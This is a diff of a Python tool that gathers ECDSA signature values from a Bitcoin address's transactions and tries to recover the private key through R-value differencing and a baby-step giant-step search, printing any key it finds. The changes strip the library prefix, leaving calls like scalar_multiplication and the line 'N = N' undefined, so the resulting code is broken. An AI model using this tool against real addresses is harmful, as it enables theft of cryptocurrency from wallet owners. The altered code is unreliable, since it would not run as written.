@@ -1,18 +1,18 @@
 # -*- coding: utf-8 -*-
 """
 
-@author: iceland
+
 """
 import sys
 import json
 import argparse
 from urllib.request import urlopen
 # from itertools import combinations
-import secp256k1 as ice
+import secp256k1 
 
-G = ice.scalar_multiplication(1)
-N = ice.N
-ZERO = ice.Zero
+G = scalar_multiplication(1)
+N = N
+ZERO = Zero
 #==============================================================================
 parser = argparse.ArgumentParser(description='This tool helps to get ECDSA Signature r,s,z values from Bitcoin Address. Also attempt to solve \
                                  for privatekey using Rvalues successive differencing mathematics using bsgs table in RAM.', 
@@ -102,27 +102,27 @@ def getSignableTxn(parsed):
                 e += '00'
             e += inp_list[i][5] # seq
         e += rest + "01000000"
-        z = ice.get_sha256(ice.get_sha256(bytes.fromhex(e))).hex()
+        z = get_sha256(get_sha256(bytes.fromhex(e))).hex()
         res.append([inp_list[one][2], inp_list[one][3], z, inp_list[one][4], e])
     return res
 #==============================================================================
 def HASH160(pubk_hex):
     iscompressed = True if len(pubk_hex) < 70 else False
-    P = ice.pub2upub(pubk_hex)
-    return ice.pubkey_to_h160(0, iscompressed, P).hex()
+    P = pub2upub(pubk_hex)
+    return pubkey_to_h160(0, iscompressed, P).hex()
 #==============================================================================
 
 # def diff_comb(alist):
-#     return [ice.point_subtraction(x, y) for x, y in combinations(alist, 2)]
+#     return [point_subtraction(x, y) for x, y in combinations(alist, 2)]
 
 def diff_comb_idx(alist):
     LL = len(alist)
     RDD = []
     for i in range(LL):
         for j in range(i+1, LL):
-            RDD.append((i, j, ice.point_subtraction(alist[i], alist[j])))
-            RDD.append((i, j, ice.point_addition(alist[i], alist[j])))
-#    return [(i, j, ice.point_subtraction(alist[i], alist[j])) for i in range(LL) for j in range(i+1, LL)]
+            RDD.append((i, j, point_subtraction(alist[i], alist[j])))
+            RDD.append((i, j, point_addition(alist[i], alist[j])))
+#    return [(i, j, point_subtraction(alist[i], alist[j])) for i in range(LL) for j in range(i+1, LL)]
     return RDD
 #==============================================================================
 def inv(a):
@@ -130,14 +130,14 @@ def inv(a):
 
 def calc_RQ(r, s, z, pub_point):
     # r, s, z in int format and pub_point in upub bytes
-    RP1 = ice.pub2upub('02' + hex(r)[2:].zfill(64))
-    RP2 = ice.pub2upub('03' + hex(r)[2:].zfill(64))
+    RP1 = pub2upub('02' + hex(r)[2:].zfill(64))
+    RP2 = pub2upub('03' + hex(r)[2:].zfill(64))
     sdr = (s * inv(r)) % N
     zdr = (z * inv(r)) % N
-    FF1 = ice.point_subtraction( ice.point_multiplication(RP1, sdr),
-                                ice.scalar_multiplication(zdr) )
-    FF2 = ice.point_subtraction( ice.point_multiplication(RP2, sdr),
-                                ice.scalar_multiplication(zdr) )
+    FF1 = point_subtraction( point_multiplication(RP1, sdr),
+                                scalar_multiplication(zdr) )
+    FF2 = point_subtraction( point_multiplication(RP2, sdr),
+                                scalar_multiplication(zdr) )
     if FF1 == pub_point: 
         print('========  RSZ to PubKey Validation [SUCCESS]  ========')
         return RP1
@@ -256,7 +256,7 @@ ice.bsgs_2nd_check_prepare(bP)
 
 solvable_diff = []
 for Q in RD:
-    found, diff = ice.bsgs_2nd_check(Q[2], -1)
+    found, diff = bsgs_2nd_check(Q[2], -1)
     if found == True:
         solvable_diff.append((Q[0], Q[1], diff.hex()))
     
@@ -268,7 +268,7 @@ for i in solvable_diff:
 #    d = getpvk(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
     di = all_pvk_candidate(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
     for d in di:
-        if ice.scalar_multiplication(d) == pub_point_Q:
+        if scalar_multiplication(d) == pub_point_Q:
             print(f'Privatekey FOUND: {hex(d)}       Address: {address}')
 #        else: print(f'Privatekey MISSED: {hex(d)}')
     print('='*70); print('-'*120)
